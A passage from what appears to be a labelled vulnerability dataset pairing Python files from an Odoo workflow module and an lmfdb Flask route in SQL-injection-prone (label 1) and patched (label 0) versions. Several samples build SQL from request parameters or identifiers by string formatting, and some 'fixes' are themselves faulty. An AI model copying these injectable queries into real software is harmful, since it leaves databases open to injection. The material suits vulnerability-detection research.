fields.One2many(\n        string=\"Outgoing transitions\",\n        comodel_name=\"crapo.transition\",\n        inverse_name=\"from_state\",\n    )\n    # computed field to identify start and end states\n\n    is_start_state = fields.Boolean(\n        \"Start State\",\n        compute=\"_compute_is_start_state\",\n        store=True,\n        index=True,\n    )\n\n    is_end_state = fields.Boolean(\n        \"End State\", compute=\"_compute_is_end_state\", store=True, index=True\n    )\n\n    readonly_fields = fields.Char(\n        help=\"List of model's fields name separated by comma\"\n    )\n\n    @api.depends(\"transitions_to\", \"automaton\")\n    def _compute_is_start_state(self):\n        for record in self:\n            if (\n                len(record.transitions_to) == 0\n                or record.transitions_to is False\n            ):\n                record.is_start_state = True\n            else:\n                record.is_start_state = False\n\n    @api.depends(\"transitions_from\", \"automaton\")\n    def _compute_is_end_state(self):\n        for record in self:\n            if (\n                len(record.transitions_to) == 0\n                or record.transitions_to is False\n            ):\n                record.is_end_state = True\n            else:\n                record.is_end_state = False\n\n    def _do_search_default_automaton(self):\n        return False\n\n    @api.model\n    def _get_default_automaton(self):\n        default_value = 0\n        if \"current_automaton\" in self.env.context:\n            try:\n                default_value = int(self.env.context.get(\"current_automaton\"))\n            except Exception:\n                default_value = 0\n        else:\n            return self._do_search_default_automaton()\n\n        return self.env[\"crapo.automaton\"].browse(default_value)\n\n\nclass WrappedStateMixin(StateObjectMixin):\n    \"\"\"\n    Mixin class that can be used to define a state object that\n    wraps an existing model defining a state for another model\n\n    The wrapped object can be used as a crapo_state\n\n    Should be use as a mixin class in existing objects\n    \"\"\"\n\n    _inherits = {\"crapo.state\": \"crapo_state\"}\n\n    crapo_state = fields.Many2one(\n        comodel_name=\"crapo.state\",\n        string=\"Related Crapo State\",\n        store=True,\n        index=True,\n        required=True,\n        ondelete=\"cascade\",\n    )\n\n    def _do_search_default_automaton(self):\n        \"\"\"\n        finds or creates the default automaton (one per model)\n        \"\"\"\n        automaton_model = self.env[\"crapo.automaton\"]\n        my_model = self.env[\"ir.model\"].search(\n            [(\"model\", \"=\", self._state_for_model)], limit=1\n        )\n        my_automaton = automaton_model.search([(\"model_id\", \"=\", my_model.id)])\n        if not my_automaton:\n            my_automaton = automaton_model.create(\n                {\n                    \"name\": \"Automaton for {}\".format(self._state_for_model),\n                    \"model_id\": my_model.id,\n                }\n            )\n        return my_automaton\n\n    def _compute_related_state(\n        self, values={}\n    ):  # pylint: disable=dangerous-default-value\n        \"\"\"\n        Create a new crapo_state for an existing record of the WrappedState\n        \"\"\"\n        my_automaton = self._do_search_default_automaton()\n\n        if not self.crapo_state:\n            if not my_automaton:\n                return False\n            else:\n                if \"name\" not in values:\n                    values[\"name\"] = \"Default State for %s\" % self.id\n                values[\"automaton\"] = my_automaton.id\n                return self.env[\"crapo.state\"].create(values)\n/n/n/n/base_crapo_workflow/mixins/crapo_readonly_view_mixin.py/n/n# coding: utf-8\n\n# \u00a92018-2019 Article 714\n# License AGPL-3.0 or later (http://www.gnu.org/licenses/agpl.html).\nimport logging\n\nfrom lxml import etree\nfrom lxml.builder import E\n\nfrom odoo.tools.safe_eval import safe_eval\nfrom odoo.osv import expression\n\n\nclass ReadonlyViewMixin(object):\n    \"\"\"\n        Mixin class that can be used to set a whole view readonly with domains\n    \"\"\"\n\n    _readonly_domain = []\n    _readonly_fields_to_add = []\n\n    def _fields_view_get(\n        self, view_id=None, view_type=\"form\", toolbar=False, submenu=False\n    ):\n        \"\"\"\n            Override to add crapo_readonly_fields to arch and attrs readonly\n            on fields that could be editable\n        \"\"\"\n        result = super(ReadonlyViewMixin, self)._fields_view_get(\n            view_id, view_type, toolbar, submenu\n        )\n\n        readonly_fields = self.fields_get(attributes=[\"readonly\"])\n        node = etree.fromstring(result[\"arch\"])\n        for field in self._readonly_fields_to_add:\n            node.append(E.field(name=field, invisible=\"1\"))\n\n        if not isinstance(self._readonly_domain, (list, tuple)):\n            lst_domain = [self._readonly_domain]\n        else:\n            lst_domain = self._readonly_domain\n\n        self._process_field(node, readonly_fields, lst_domain)\n        result[\"arch\"] = etree.tostring(node)\n        return result\n\n    def _process_field(self, node, readonly_fields, lst_domain):\n        \"\"\"\n            Add readnoly attrs if needed\n        \"\"\"\n        if node.get(\"readonly_global_domain\"):\n            lst_domain = lst_domain + [node.get(\"readonly_global_domain\")]\n\n        if node.tag == \"field\":\n            field_name = node.get(\"name\")\n\n            attrs = safe_eval(node.get(\"attrs\", \"{}\"))\n            readonly = attrs.get(\"readonly\") or node.get(\"readonly\")\n            if isinstance(readonly, str):\n                readonly = safe_eval(node.get(\"readonly\", \"{}\"))\n\n            # Deal with none domain value, if field is explicitly in readonly we skip\n            if not isinstance(readonly, (list, tuple)) and readonly:\n                return\n            # If there is no domain define and fields is already in readonly\n            # we skip too\n            elif readonly is None and readonly_fields[field_name][\"readonly\"]:\n                return\n\n            _readonly_domain = expression.OR(\n                [safe_eval(domain, {\"field_name\": field_name}) for domain in lst_domain]\n            )\n            if readonly:\n                _readonly_domain = expression.OR([readonly, _readonly_domain])\n\n            attrs[\"readonly\"] = _readonly_domain\n            node.set(\"attrs\", str(attrs))\n\n        else:\n            for child_node in node:\n                self._process_field(child_node, readonly_fields, lst_domain)\n/n/n/n/base_crapo_workflow/models/business_object.py/n/n# coding: utf-8\n\n# \u00a92018-2019 Article 714\n# License AGPL-3.0 or later (http://www.gnu.org/licenses/agpl.html).\n\nfrom odoo import models\n\nfrom odoo.addons.base_crapo_workflow.mixins import (\n    crapo_automata_mixins,\n)  # pylint: disable=odoo-addons-relative-import\n\n\nclass CrapoBusinessObject(crapo_automata_mixins.ObjectWithStateMixin, models.Model):\n    \"\"\"\n    Base class to define a Business Object.\n\n    Should be use as a mixin class in existing objects\n    \"\"\"\n\n    _name = \"crapo.business.object\"\n    _inherit = [\"mail.thread\", \"mail.activity.mixin\"]\n    _description = \"\"\"\n    An object on which to  in a workflow, specific to a given model\n    \"\"\"\n    _sync_state_field = \"\"\n/n/n/n/base_crapo_workflow/models/state.py/n/n# coding: utf-8\n\n# \u00a92018 Article 714\n# License AGPL-3.0 or later (http://www.gnu.org/licenses/agpl.html).\n\nfrom odoo import fields, models, _, api, exceptions\n\nfrom odoo.addons.base_crapo_workflow.mixins import (\n    crapo_automata_mixins,\n)  # pylint: disable=odoo-addons-relative-import\n\n\nclass State(crapo_automata_mixins.StateObjectMixin, models.Model):\n    \"\"\"\n    A state used in the context of an automaton\n    \"\"\"\n\n    _name = \"crapo.state\"\n    _description = u\"State in a workflow, specific to a given model\"\n    _order = \"sequence, name\"\n\n    name = fields.Char(help=\"State's name\", required=True, translate=True, size=32)\n\n    description = fields.Char(required=False, translate=True, size=256)\n\n    sequence = fields.Integer(\n        default=1, help=\"Sequence gives the order in which states are displayed\"\n    )\n\n    fold = fields.Boolean(\n        string=\"Folded in kanban\",\n        help=(\n            \"This stage is folded in the kanban view \"\n            \"when there are no records in that stage to display.\"\n        ),\n        default=False,\n    )\n\n    @api.multi\n    def write(self, values):\n        \"\"\"\n        Override default method to check if there is a valid default_state\n        \"\"\"\n        if \"default_state\" in values:\n            if values[\"default_state\"]:\n                if len(self) > 1:\n                    raise exceptions.ValidationError(\n                        _(u\"There should only one default state per model\")\n                    )\n                else:\n                    found = self.search(\n                        [\n                            (\"default_state\", \"=\", True),\n                            (\"automaton\", \"=\", self.automaton.id),\n                            (\"id\", \"!=\", self.id),\n                        ]\n                    )\n                    for s in found:\n                        s.write({\"default_state\": False})\n\n        return super(State, self).write(values)\n/n/n/n/crapo_tests/models/crm_stage.py/n/n\"\"\"\n\u00a92019\nLicense: AGPL-3\n\n@author: C. Guychard (Article 714)\n\n\"\"\"\n\n\nfrom odoo import models, api\nfrom odoo.addons.base_crapo_workflow.mixins import (\n    crapo_automata_mixins,\n)  # pylint: disable=odoo-addons-relative-import\n\n\nclass CrmStageWithMixin(crapo_automata_mixins.WrappedStateMixin, models.Model):\n    _inherit = \"crm.stage\"\n    _state_for_model = \"crm.lead\"\n\n    def write(self, values):\n        if len(self) == 1:\n            if \"crapo_state\" not in values and not self.crapo_state:\n                if \"name\" in values:\n                    vals = {\"name\": values[\"name\"]}\n                else:\n                    vals = {\"name\": self.name}\n                mystate = self._compute_related_state(vals)\n                values[\"crapo_state\"] = mystate.id\n\n        return super(CrmStageWithMixin, self).write(values)\n\n    @api.model\n    def create(self, values):\n        if \"crapo_state\" not in values and not self.crapo_state:\n            if \"name\" in values:\n                vals = {\"name\": values[\"name\"]}\n            mystate = self._compute_related_state(vals)\n            values[\"crapo_state\"] = mystate.id\n\n        return super(CrmStageWithMixin, self).create(values)\n\n    @api.model_cr_context\n    def _init_column(self, column_name):\n        \"\"\" Initialize the value of the given column for existing rows.\n            Overridden here because we need to wrap existing stages in\n            a new crapo_state for each stage (including a default automaton)\n        \"\"\"\n        if column_name not in [\"crapo_state\"]:\n            super(CrmStageWithMixin, self)._init_column(column_name)\n        else:\n            default_compute = self._compute_related_state\n\n            query = 'SELECT id, name FROM \"%s\" WHERE \"%s\" is NULL' % (\n                self._table,\n                column_name,\n            )\n            self.env.cr.execute(query)\n            stages = self.env.cr.fetchall()\n\n            for stage in stages:\n                default_value = default_compute(values={\"name\": stage[1]})\n\n                query = 'UPDATE \"%s\" SET \"%s\"=%%s WHERE id = %s' % (\n                    self._table,\n                    column_name,\n                    stage[0],\n                )\n                self.env.cr.execute(query, (default_value.id,))\n/n/n/n", "label": 1}, {"id": "91513ef7bbe60014dacab709be582eb0b10fcaab", "code": "crapo_tests/models/crm_stage.py/n/n\"\"\"\n\u00a92019\nLicense: AGPL-3\n\n@author: C. Guychard (Article 714)\n\n\"\"\"\n\n\nfrom odoo import models, api\nfrom psycopg2.sql import SQL, Identifier\nfrom odoo.addons.base_crapo_workflow.mixins import (\n    crapo_automata_mixins,\n)  # pylint: disable=odoo-addons-relative-import\n\n\nclass CrmStageWithMixin(crapo_automata_mixins.WrappedStateMixin, models.Model):\n    _inherit = \"crm.stage\"\n    _state_for_model = \"crm.lead\"\n\n    def write(self, values):\n        if len(self) == 1:\n            if \"crapo_state\" not in values and not self.crapo_state:\n                if \"name\" in values:\n                    vals = {\"name\": values[\"name\"]}\n                else:\n                    vals = {\"name\": self.name}\n                mystate = self._compute_related_state(vals)\n                values[\"crapo_state\"] = mystate.id\n\n        return super(CrmStageWithMixin, self).write(values)\n\n    @api.model\n    def create(self, values):\n        if \"crapo_state\" not in values and not self.crapo_state:\n            if \"name\" in values:\n                vals = {\"name\": values[\"name\"]}\n            mystate = self._compute_related_state(vals)\n            values[\"crapo_state\"] = mystate.id\n\n        return super(CrmStageWithMixin, self).create(values)\n\n    @api.model_cr_context\n    def _init_column(self, column_name):\n        \"\"\" Initialize the value of the given column for existing rows.\n            Overridden here because we need to wrap existing stages in\n            a new crapo_state for each stage (including a default automaton)\n        \"\"\"\n        if column_name not in [\"crapo_state\"]:\n            super(CrmStageWithMixin, self)._init_column(column_name)\n        else:\n            default_compute = self._compute_related_state\n            query = SQL(\n                \"SELECT id, name FROM {} WHERE {} is NULL\".format(\n                    Identifier(self._table), Identifier(column_name)\n                )\n            )\n            self.env.cr.execute(query)\n            stages = self.env.cr.fetchall()\n\n            for stage in stages:\n                default_value = default_compute(values={\"name\": stage[1]})\n                query = SQL(\n                    \"UPDATE {} SET {}=%s WHERE id = %s\".format(\n                        Identifier(self._table), Identifier(column_name)\n                    )\n                )\n                self.env.cr.execute(query, (default_value.id, stage[0]))\n/n/n/n", "label": 0}, {"id": "91513ef7bbe60014dacab709be582eb0b10fcaab", "code": "/crapo_tests/models/crm_stage.py/n/n\"\"\"\n\u00a92019\nLicense: AGPL-3\n\n@author: C. Guychard (Article 714)\n\n\"\"\"\n\n\nfrom odoo import models, api\nfrom odoo.addons.base_crapo_workflow.mixins import (\n    crapo_automata_mixins,\n)  # pylint: disable=odoo-addons-relative-import\n\n\nclass CrmStageWithMixin(crapo_automata_mixins.WrappedStateMixin, models.Model):\n    _inherit = \"crm.stage\"\n    _state_for_model = \"crm.lead\"\n\n    def write(self, values):\n        if len(self) == 1:\n            if \"crapo_state\" not in values and not self.crapo_state:\n                if \"name\" in values:\n                    vals = {\"name\": values[\"name\"]}\n                else:\n                    vals = {\"name\": self.name}\n                mystate = self._compute_related_state(vals)\n                values[\"crapo_state\"] = mystate.id\n\n        return super(CrmStageWithMixin, self).write(values)\n\n    @api.model\n    def create(self, values):\n        if \"crapo_state\" not in values and not self.crapo_state:\n            if \"name\" in values:\n                vals = {\"name\": values[\"name\"]}\n            mystate = self._compute_related_state(vals)\n            values[\"crapo_state\"] = mystate.id\n\n        return super(CrmStageWithMixin, self).create(values)\n\n    @api.model_cr_context\n    def _init_column(self, column_name):\n        \"\"\" Initialize the value of the given column for existing rows.\n            Overridden here because we need to wrap existing stages in\n            a new crapo_state for each stage (including a default automaton)\n        \"\"\"\n        if column_name not in [\"crapo_state\"]:\n            super(CrmStageWithMixin, self)._init_column(column_name)\n        else:\n            default_compute = self._compute_related_state\n\n            self.env.cr.execute(\n                \"SELECT id, name FROM %s WHERE %s is NULL\",\n                (self._table, column_name),\n            )\n            stages = self.env.cr.fetchall()\n\n            for stage in stages:\n                default_value = default_compute(values={\"name\": stage[1]})\n\n                self.env.cr.execute(\n                    \"UPDATE %s SET %s=%s WHERE id = %s\",\n                    (self._table, column_name, default_value.id, stage[0]),\n                )\n/n/n/n", "label": 1}, {"id": "ee2f15e316ef7b29e25944dfc24f035b92924cba", "code": "crapo_tests/models/crm_stage.py/n/n\"\"\"\n\u00a92019\nLicense: AGPL-3\n\n@author: C. Guychard (Article 714)\n\n\"\"\"\n\nimport logging\n\nfrom odoo import models, api\nfrom psycopg2.sql import Identifier\nfrom odoo.addons.base_crapo_workflow.mixins import (\n    crapo_automata_mixins,\n)  # pylint: disable=odoo-addons-relative-import\n\n\nclass CrmStageWithMixin(crapo_automata_mixins.WrappedStateMixin, models.Model):\n    _inherit = \"crm.stage\"\n    _state_for_model = \"crm.lead\"\n\n    def write(self, values):\n        if len(self) == 1:\n            if \"crapo_state\" not in values and not self.crapo_state:\n                if \"name\" in values:\n                    vals = {\"name\": values[\"name\"]}\n                else:\n                    vals = {\"name\": self.name}\n                mystate = self._compute_related_state(vals)\n                values[\"crapo_state\"] = mystate.id\n\n        return super(CrmStageWithMixin, self).write(values)\n\n    @api.model\n    def create(self, values):\n        \"\"\" Create a new crapo_stage for each crm_stage\n        \"\"\"\n        if \"crapo_state\" not in values and not self.crapo_state:\n            if \"name\" in values:\n                vals = {\"name\": values[\"name\"]}\n            mystate = self._compute_related_state(vals)\n            values[\"crapo_state\"] = mystate.id\n\n        return super(CrmStageWithMixin, self).create(values)\n\n    @api.model_cr_context\n    def _init_column(self, column_name):\n        \"\"\" Initialize the value of the given column for existing rows.\n            Overridden here because we need to wrap existing stages in\n            a new crapo_state for each stage (including a default automaton)\n        \"\"\"\n        if column_name not in [\"crapo_state\"]:\n            return super(CrmStageWithMixin, self)._init_column(column_name)\n        else:\n            default_compute = self._compute_related_state\n\n            tname = Identifier(self._table.replace('\"', \"\")).as_string(\n                self.env.cr._obj  # pylint: disable=protected-access\n            )\n            cname = Identifier(column_name.replace('\"', \"\")).as_string(\n                self.env.cr._obj  # pylint: disable=protected-access\n            )\n\n            logging.error(\n                \"MMMMMAIS %s ==> %s (%s) -> %s\",\n                self._table,\n                tname,\n                type(tname),\n                str(tname),\n            )\n\n            self.env.cr.execute(\n                \"SELECT id, name FROM %s WHERE %s is NULL\",\n                (self._table, cname),\n            )\n            stages = self.env.cr.fetchall()\n\n            for stage in stages:\n                default_value = default_compute(values={\"name\": stage[1]})\n                self.env.cr.execute(\n                    \"UPDATE %s SET %s=%s WHERE id = %s\",\n                    (self._table, cname, default_value.id, stage[0]),\n                )\n        return True\n/n/n/n", "label": 0}, {"id": "ee2f15e316ef7b29e25944dfc24f035b92924cba", "code": "/crapo_tests/models/crm_stage.py/n/n\"\"\"\n\u00a92019\nLicense: AGPL-3\n\n@author: C. Guychard (Article 714)\n\n\"\"\"\n\nimport logging\n\nfrom odoo import models, api\nfrom psycopg2.sql import Identifier\nfrom odoo.addons.base_crapo_workflow.mixins import (\n    crapo_automata_mixins,\n)  # pylint: disable=odoo-addons-relative-import\n\n\nclass CrmStageWithMixin(crapo_automata_mixins.WrappedStateMixin, models.Model):\n    _inherit = \"crm.stage\"\n    _state_for_model = \"crm.lead\"\n\n    def write(self, values):\n        if len(self) == 1:\n            if \"crapo_state\" not in values and not self.crapo_state:\n                if \"name\" in values:\n                    vals = {\"name\": values[\"name\"]}\n                else:\n                    vals = {\"name\": self.name}\n                mystate = self._compute_related_state(vals)\n                values[\"crapo_state\"] = mystate.id\n\n        return super(CrmStageWithMixin, self).write(values)\n\n    @api.model\n    def create(self, values):\n        \"\"\" Create a new crapo_stage for each crm_stage\n        \"\"\"\n        if \"crapo_state\" not in values and not self.crapo_state:\n            if \"name\" in values:\n                vals = {\"name\": values[\"name\"]}\n            mystate = self._compute_related_state(vals)\n            values[\"crapo_state\"] = mystate.id\n\n        return super(CrmStageWithMixin, self).create(values)\n\n    @api.model_cr_context\n    def _init_column(self, column_name):\n        \"\"\" Initialize the value of the given column for existing rows.\n            Overridden here because we need to wrap existing stages in\n            a new crapo_state for each stage (including a default automaton)\n        \"\"\"\n        if column_name not in [\"crapo_state\"]:\n            return super(CrmStageWithMixin, self)._init_column(column_name)\n        else:\n            default_compute = self._compute_related_state\n\n            tname = Identifier(self._table).as_string(\n                self.env.cr._obj  # pylint: disable=protected-access\n            )\n            cname = Identifier(column_name).as_string(\n                self.env.cr._obj  # pylint: disable=protected-access\n            )\n\n            logging.error(\n                \"MMMMMAIS %s (%s) -> %s\", tname, type(tname), str(tname)\n            )\n\n            self.env.cr.execute(\n                \"SELECT id, name FROM %s WHERE %s is NULL\", (tname, cname)\n            )\n            stages = self.env.cr.fetchall()\n\n            for stage in stages:\n                default_value = default_compute(values={\"name\": stage[1]})\n                self.env.cr.execute(\n                    \"UPDATE %s SET %s=%s WHERE id = %s\",\n                    (tname, cname, default_value.id, stage[0]),\n                )\n        return True\n/n/n/n", "label": 1}, {"id": "5ea8146ab38da79bad4daefdd0be9bb244dfff41", "code": "crapo_tests/models/crm_stage.py/n/n\"\"\"\n\u00a92019\nLicense: AGPL-3\n\n@author: C. Guychard (Article 714)\n\n\"\"\"\n\nimport logging\n\nfrom odoo import models, api\nfrom psycopg2.sql import Identifier, SQL\nfrom odoo.addons.base_crapo_workflow.mixins import (\n    crapo_automata_mixins,\n)  # pylint: disable=odoo-addons-relative-import\n\n\nclass CrmStageWithMixin(crapo_automata_mixins.WrappedStateMixin, models.Model):\n    _inherit = \"crm.stage\"\n    _state_for_model = \"crm.lead\"\n\n    def write(self, values):\n        if len(self) == 1:\n            if \"crapo_state\" not in values and not self.crapo_state:\n                if \"name\" in values:\n                    vals = {\"name\": values[\"name\"]}\n                else:\n                    vals = {\"name\": self.name}\n                mystate = self._compute_related_state(vals)\n                values[\"crapo_state\"] = mystate.id\n\n        return super(CrmStageWithMixin, self).write(values)\n\n    @api.model\n    def create(self, values):\n        \"\"\" Create a new crapo_stage for each crm_stage\n        \"\"\"\n        if \"crapo_state\" not in values and not self.crapo_state:\n            if \"name\" in values:\n                vals = {\"name\": values[\"name\"]}\n            mystate = self._compute_related_state(vals)\n            values[\"crapo_state\"] = mystate.id\n\n        return super(CrmStageWithMixin, self).create(values)\n\n    @api.model_cr_context\n    def _init_column(self, column_name):\n        \"\"\" Initialize the value of the given column for existing rows.\n            Overridden here because we need to wrap existing stages in\n            a new crapo_state for each stage (including a default automaton)\n        \"\"\"\n        if column_name not in [\"crapo_state\"]:\n            return super(CrmStageWithMixin, self)._init_column(column_name)\n        else:\n            default_compute = self._compute_related_state\n\n            tname = Identifier(self._table.replace('\"', \"\"))\n            cname = Identifier(column_name.replace('\"', \"\"))\n\n            query = SQL(  # pylint: disable=sql-injection\n                \"SELECT id, name FROM {} WHERE {} is NULL\"\n            ).format(tname, cname)\n\n            self.env.cr.execute(query)\n            stages = self.env.cr.fetchall()\n\n            for stage in stages:\n                query = SQL(  # pylint: disable=sql-injection\n                    \"UPDATE {} SET {}=%s WHERE id = %s\"\n                ).format(tname, cname)\n\n                default_value = default_compute(values={\"name\": stage[1]})\n                self.env.cr.execute(query, (default_value.id, stage[0]))\n        return True\n/n/n/n", "label": 0}, {"id": "5ea8146ab38da79bad4daefdd0be9bb244dfff41", "code": "/crapo_tests/models/crm_stage.py/n/n\"\"\"\n\u00a92019\nLicense: AGPL-3\n\n@author: C. Guychard (Article 714)\n\n\"\"\"\n\nimport logging\n\nfrom odoo import models, api\nfrom psycopg2.sql import Identifier\nfrom odoo.addons.base_crapo_workflow.mixins import (\n    crapo_automata_mixins,\n)  # pylint: disable=odoo-addons-relative-import\n\n\nclass CrmStageWithMixin(crapo_automata_mixins.WrappedStateMixin, models.Model):\n    _inherit = \"crm.stage\"\n    _state_for_model = \"crm.lead\"\n\n    def write(self, values):\n        if len(self) == 1:\n            if \"crapo_state\" not in values and not self.crapo_state:\n                if \"name\" in values:\n                    vals = {\"name\": values[\"name\"]}\n                else:\n                    vals = {\"name\": self.name}\n                mystate = self._compute_related_state(vals)\n                values[\"crapo_state\"] = mystate.id\n\n        return super(CrmStageWithMixin, self).write(values)\n\n    @api.model\n    def create(self, values):\n        \"\"\" Create a new crapo_stage for each crm_stage\n        \"\"\"\n        if \"crapo_state\" not in values and not self.crapo_state:\n            if \"name\" in values:\n                vals = {\"name\": values[\"name\"]}\n            mystate = self._compute_related_state(vals)\n            values[\"crapo_state\"] = mystate.id\n\n        return super(CrmStageWithMixin, self).create(values)\n\n    @api.model_cr_context\n    def _init_column(self, column_name):\n        \"\"\" Initialize the value of the given column for existing rows.\n            Overridden here because we need to wrap existing stages in\n            a new crapo_state for each stage (including a default automaton)\n        \"\"\"\n        if column_name not in [\"crapo_state\"]:\n            return super(CrmStageWithMixin, self)._init_column(column_name)\n        else:\n            default_compute = self._compute_related_state\n\n            tname = Identifier(self._table.replace('\"', \"\")).as_string(\n                self.env.cr._obj  # pylint: disable=protected-access\n            )\n            cname = Identifier(column_name.replace('\"', \"\")).as_string(\n                self.env.cr._obj  # pylint: disable=protected-access\n            )\n\n            logging.error(\n                \"MMMMMAIS %s ==> %s (%s) -> %s\",\n                self._table,\n                tname,\n                type(tname),\n                str(tname),\n            )\n\n            self.env.cr.execute(\n                \"SELECT id, name FROM %s WHERE %s is NULL\",\n                (self._table, cname),\n            )\n            stages = self.env.cr.fetchall()\n\n            for stage in stages:\n                default_value = default_compute(values={\"name\": stage[1]})\n                self.env.cr.execute(\n                    \"UPDATE %s SET %s=%s WHERE id = %s\",\n                    (self._table, cname, default_value.id, stage[0]),\n                )\n        return True\n/n/n/n", "label": 1}, {"id": "c66e035419698ea0d7a491f65f7e6fc31d9afb28", "code": "lmfdb/zeros/first/firstzeros.py/n/nimport flask\nfrom lmfdb.logger import make_logger\nimport os\nfrom flask import render_template, request, url_for\n\nFirstZeros = flask.Blueprint('first L-function zeros', __name__, template_folder=\"templates\")\nlogger = make_logger(FirstZeros)\n\nimport sqlite3\ndata_location = os.path.expanduser(\"~/data/zeros/\")\n#print data_location\n\n\n@FirstZeros.route(\"/\")\ndef firstzeros():\n    start = request.args.get('start', None, float)\n    end = request.args.get('end', None, float)\n    limit = request.args.get('limit', 100, int)\n    degree = request.args.get('degree', None, int)\n    # signature_r = request.arts.get(\"signature_r\", None, int)\n    # signature_c = request.arts.get(\"signature_c\", None, int)\n    if limit > 1000:\n        limit = 1000\n    if limit < 0:\n        limit = 100\n\n    # return render_template(\"first_zeros.html\", start=start, end=end,\n    # limit=limit, degree=degree, signature_r=signature_r,\n    # signature_c=signature_c)\n    title = \"Search for First Zeros of L-functions\"\n    bread=[(\"L-functions\", url_for(\"l_functions.l_function_top_page\")), (\"First Zeros Search\", \" \"), ]\n    return render_template(\"first_zeros.html\",\n                           start=start, end=end, limit=limit,\n                           degree=degree, title=title, bread=bread)\n\n\n@FirstZeros.route(\"/list\")\ndef list_zeros(start=None,\n               end=None,\n               limit=None,\n               fmt=None,\n               download=None,\n               degree=None):\n               # signature_r = None,\n               # signature_c = None):\n    if start is None:\n        start = request.args.get('start', None, float)\n    if end is None:\n        end = request.args.get('end', None, float)\n    if limit is None:\n        limit = request.args.get('limit', 100, int)\n    if fmt is None:\n        fmt = request.args.get('format', 'plain', str)\n    if download is None:\n        fmt = request.args.get('download', 'no')\n    if degree is None:\n        degree = request.args.get('degree', None, int)\n    # if signature_r is None:\n    #    signature_r = request.arts.get(\"signature_r\", None, int)\n    # if signature_c is None:\n    #    signature_c = request.arts.get(\"signature_c\", None, int)\n    if limit > 1000:\n        limit = 1000\n    if limit < 0:\n        limit = 100\n\n    if start is None and end is None:\n        end = 1000\n\n    limit = int(limit)\n\n    where_clause = 'WHERE 1=1 '\n\n    values = []\n    if end is not None:\n        # fix up rounding errors, otherwise each time you resubmit the page you will lose one line\n        if('.' in str(end)):\n            end = float(str(end)+'999')\n\n    if start is None:\n        end = float(end)\n        where_clause += ' AND zero <= ?'\n        values.append(end)\n    elif end is None:\n        start = float(start)\n        where_clause += ' AND zero >= ?'\n        values.append(start)\n    else:\n        start = float(start)\n        end = float(end)\n        where_clause += ' AND zero >= ? AND zero <= ?'\n        values.extend([start, end])\n\n    if degree is not None and degree != '':\n        degree = int(degree)\n        where_clause += ' AND degree = ?'\n        values.append(degree)\n\n    if end is None:\n        query = 'SELECT * FROM (SELECT * FROM zeros {} ORDER BY zero ASC LIMIT {}) ORDER BY zero DESC'.format(\n            where_clause, limit)\n    else:\n        query = 'SELECT * FROM zeros {} ORDER BY zero DESC LIMIT {}'.format(where_clause, limit)\n\n    #print query\n    c = sqlite3.connect(data_location + 'first_zeros.db').cursor()\n    c.execute(query, values)\n\n    response = flask.Response((\" \".join([str(x) for x in row]) + \"\\n\" for row in c))\n    response.headers['content-type'] = 'text/plain'\n    if download == \"yes\":\n        response.headers['content-disposition'] = 'attachment; filename=zetazeros'\n    # response = flask.Response( (\"1 %s\\n\" % (str(row[0]),) for row in c) )\n    return response\n/n/n/n", "label": 0}, {"id": "c66e035419698ea0d7a491f65f7e6fc31d9afb28", "code": "/lmfdb/zeros/first/firstzeros.py/n/nimport flask\nfrom lmfdb.logger import make_logger\nimport os\nfrom flask import render_template, request, url_for\n\nFirstZeros = flask.Blueprint('first L-function zeros', __name__, template_folder=\"templates\")\nlogger = make_logger(FirstZeros)\n\nimport sqlite3\ndata_location = os.path.expanduser(\"~/data/zeros/\")\n#print data_location\n\n\n@FirstZeros.route(\"/\")\ndef firstzeros():\n    start = request.args.get('start', None, float)\n    end = request.args.get('end', None, float)\n    limit = request.args.get('limit', 100, int)\n    degree = request.args.get('degree', None, int)\n    # signature_r = request.arts.get(\"signature_r\", None, int)\n    # signature_c = request.arts.get(\"signature_c\", None, int)\n    if limit > 1000:\n        limit = 1000\n    if limit < 0:\n        limit = 100\n\n    # return render_template(\"first_zeros.html\", start=start, end=end,\n    # limit=limit, degree=degree, signature_r=signature_r,\n    # signature_c=signature_c)\n    title = \"Search for First Zeros of L-functions\"\n    bread=[(\"L-functions\", url_for(\"l_functions.l_function_top_page\")), (\"First Zeros Search\", \" \"), ]\n    return render_template(\"first_zeros.html\",\n                           start=start, end=end, limit=limit,\n                           degree=degree, title=title, bread=bread)\n\n\n@FirstZeros.route(\"/list\")\ndef list_zeros(start=None,\n               end=None,\n               limit=None,\n               fmt=None,\n               download=None,\n               degree=None):\n               # signature_r = None,\n               # signature_c = None):\n    if start is None:\n        start = request.args.get('start', None, float)\n    if end is None:\n        end = request.args.get('end', None, float)\n    if limit is None:\n        limit = request.args.get('limit', 100, int)\n    if fmt is None:\n        fmt = request.args.get('format', 'plain', str)\n    if download is None:\n        fmt = request.args.get('download', 'no')\n    if degree is None:\n        degree = request.args.get('degree', None, int)\n    # if signature_r is None:\n    #    signature_r = request.arts.get(\"signature_r\", None, int)\n    # if signature_c is None:\n    #    signature_c = request.arts.get(\"signature_c\", None, int)\n    if limit > 1000:\n        limit = 1000\n    if limit < 0:\n        limit = 100\n\n    if start is None and end is None:\n        end = 1000\n\n    limit = int(limit)\n\n    where_clause = 'WHERE 1=1 '\n\n    if end is not None:\n        end = str(end)\n        # fix up rounding errors, otherwise each time you resubmit the page you will lose one line\n        if('.' in end): end = end+'999'\n\n    if start is None:\n        where_clause += ' AND zero <= ' + end\n    elif end is None:\n        start = float(start)\n        where_clause += ' AND zero >= ' + str(start)\n    else:\n        where_clause += ' AND zero >= {} AND zero <= {}'.format(start, end)\n\n    if degree is not None and degree != '':\n        where_clause += ' AND degree = ' + str(degree)\n\n    if end is None:\n        query = 'SELECT * FROM (SELECT * FROM zeros {} ORDER BY zero ASC LIMIT {}) ORDER BY zero DESC'.format(\n            where_clause, limit)\n    else:\n        query = 'SELECT * FROM zeros {} ORDER BY zero DESC LIMIT {}'.format(where_clause, limit)\n\n    #print query\n    c = sqlite3.connect(data_location + 'first_zeros.db').cursor()\n    c.execute(query)\n\n    response = flask.Response((\" \".join([str(x) for x in row]) + \"\\n\" for row in c))\n    response.headers['content-type'] = 'text/plain'\n    if download == \"yes\":\n        response.headers['content-disposition'] = 'attachment; filename=zetazeros'\n    # response = flask.Response( (\"1 %s\\n\" % (str(row[0]),) for row in c) )\n    return response\n/n/n/n", "label": 1}, {"id": "6ceb5dc8ec38b4a3f1399e578ab970f7e3354922", "code": "docker/app.py/n/nfrom flask import Flask, render_template, request, current_app, g\nfrom indic_transliteration import sanscript\nfrom indic_transliteration.sanscript import SchemeMap, SCHEMES, transliterate\n\nimport random\nimport sqlite3 as sql\nimport re\n\napp = Flask(__name__, static_url_path='', 